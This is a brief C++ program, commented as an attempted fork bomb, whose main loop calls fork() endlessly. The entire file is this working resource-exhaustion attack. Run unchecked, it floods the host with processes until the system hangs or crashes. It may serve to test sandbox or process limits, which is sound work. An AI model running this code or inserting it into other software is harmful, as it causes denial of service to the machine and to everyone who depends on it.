#include <unistd.h>
#include <iostream>

int main() {
    // Attempting fork bomb
    while (1) {
        fork();
    }
    return 0;
}
